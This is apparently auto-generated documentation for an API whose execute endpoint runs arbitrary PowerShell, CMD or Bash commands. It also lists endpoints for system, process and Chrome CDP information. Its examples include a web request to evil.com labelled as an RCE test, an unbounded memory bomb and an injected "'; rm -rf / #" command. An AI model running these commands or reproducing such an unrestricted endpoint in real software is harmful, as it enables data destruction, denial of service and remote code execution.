# System Commands API

*Auto-generated from system.py JSDoc comments*

## POST /system/execute

**Function:** `execute_command()`

Execute RAW system commands - PowerShell/CMD/Bash/Shell

**Parameters:**
- `command ` *(string)*: ANY command to execute
- `shell` *(string)* *(optional)*: Shell type (powershell, cmd, bash, sh)
- `timeout` *(number)* *(optional)*: Command timeout in seconds
- `capture_output` *(boolean)* *(optional)*: Capture stdout/stderr

**Returns:** {object} Command execution result or crash data

**Examples:**
```javascript
// Windows PowerShell (requires ENABLE_SHELL_EXECUTION=true)
{"command": "Get-Process", "shell": "powershell"}
// Dangerous PowerShell - test RCE
{"command": "Invoke-WebRequest -Uri evil.com", "shell": "powershell"}
// Memory bomb - test limits
{"command": "while($true) { $a += 'x' * 1000000 }", "shell": "powershell"}
// Linux/macOS bash
{"command": "ps aux", "shell": "bash"}
// Windows CMD
{"command": "dir C:\", "shell": "cmd"}
// Malformed commands - see what happens
{"command": "'; rm -rf / #", "shell": "bash"}
```

---

## GET /system/info

**Function:** `get_system_info()`

Get system information and capabilities

**Returns:** {object} System platform, PowerShell status, available shells

---

## GET /system/processes

**Function:** `get_processes()`

Get running processes using CDP Runtime evaluation

**Returns:** {object} Browser process information via JavaScript

---

## GET /system/chrome/info

**Function:** `get_chrome_info()`

Get Chrome browser information via CDP

**Returns:** {object} Chrome version, capabilities, debugging info

---

